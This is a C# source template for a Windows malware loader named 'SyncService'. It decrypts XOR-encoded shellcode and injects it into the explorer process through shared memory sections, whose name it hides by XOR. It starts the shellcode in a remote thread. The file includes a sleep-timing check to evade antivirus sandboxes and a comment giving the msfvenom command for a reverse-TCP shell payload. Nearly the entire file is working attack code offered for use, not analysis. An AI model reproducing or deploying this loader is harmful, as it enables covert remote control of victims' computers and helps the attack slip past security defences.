using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace SyncService
{
    internal class Program
    {
        private static readonly uint SECTION_MAP_READ = 0x0004;
        private static readonly uint SECTION_MAP_WRITE = 0x0002;
        private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        private static readonly uint SEC_COMMIT = 0x8000000;
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_READEXECUTE = 0x20;
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;

        // XOR key used to encrypt shellcode at rest (randomized per build)
        public const byte XorKey = {xor_key};

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtCreateSection(
            ref IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref uint MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            out ulong SectionOffset,
            out int ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(
            out IntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Thread.Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }
            // XOR-encrypted shellcode (pre-encrypted offline with XorKey = 0xfa)
            // Generate raw shellcode:
            //   msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=<IP> LPORT=4444 -f raw > sc.bin
            // Then XOR each byte with 0xfa before embedding here
            {encrypted_shellcode}

            // 1. Resolve target process name at runtime (XOR-obfuscated)
            byte[] tn = new byte[] { 0x27, 0x3A, 0x32, 0x2E, 0x2D, 0x30, 0x27, 0x30 };
            for (int q = 0; q < tn.Length; q++) tn[q] ^= 0x42;
            string targetName = System.Text.Encoding.ASCII.GetString(tn);

            // Open target and local process handles
            Process[] targetProcess = Process.GetProcessesByName(targetName);
            IntPtr hRemoteProcess = OpenProcess(0x001F0FFF, false, targetProcess[0].Id);
            IntPtr hLocalProcess = Process.GetCurrentProcess().Handle;

            // 2. Decrypt shellcode locally before copying into shared section
            int i = 0;
            while (i < buf.Length)
            {
                buf[i] = (byte)(buf[i] ^ XorKey);
                i++;
            }

            // 3. Create a shared memory section sized to shellcode
            IntPtr sectionHandle = IntPtr.Zero;
            uint bufferLength = (uint)buf.Length;
            NtCreateSection(
                ref sectionHandle,
                SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                IntPtr.Zero,
                ref bufferLength,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            // 4. Map section into local process as RW (write shellcode into it)
            IntPtr localBaseAddress = IntPtr.Zero;
            int sizeLocal = buf.Length;
            ulong offsetLocal = 0;
            NtMapViewOfSection(
                sectionHandle,
                hLocalProcess,
                ref localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                out offsetLocal,
                out sizeLocal,
                2,                  // ViewUnmap — not inherited by child processes
                0,
                PAGE_READWRITE);    // Local view: RW only

            // 5. Map same section into remote process as RX (execute from it)
            IntPtr remoteBaseAddress = IntPtr.Zero;
            int sizeRemote = buf.Length;
            ulong offsetRemote = 0;
            NtMapViewOfSection(
                sectionHandle,
                hRemoteProcess,
                ref remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                out offsetRemote,
                out sizeRemote,
                2,                  // ViewUnmap
                0,
                PAGE_READEXECUTE);  // Remote view: RX only (W^X)

            // 6. Copy decrypted shellcode into local view
            //    (mirrors directly into remote view via shared section)
            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);

            // 7. Unmap local view — shellcode no longer writable locally
            NtUnmapViewOfSection(hLocalProcess, localBaseAddress);

            // 8. Execute shellcode in remote process via remote view
            IntPtr hRemoteThread;
            NtCreateThreadEx(
                out hRemoteThread,
                0x1FFFFF,
                IntPtr.Zero,
                hRemoteProcess,
                remoteBaseAddress,
                IntPtr.Zero,
                false, 0, 0, 0,
                IntPtr.Zero);

            // 9. Close section handle — remote view keeps the mapping alive
            NtClose(sectionHandle);
        }
    }
}
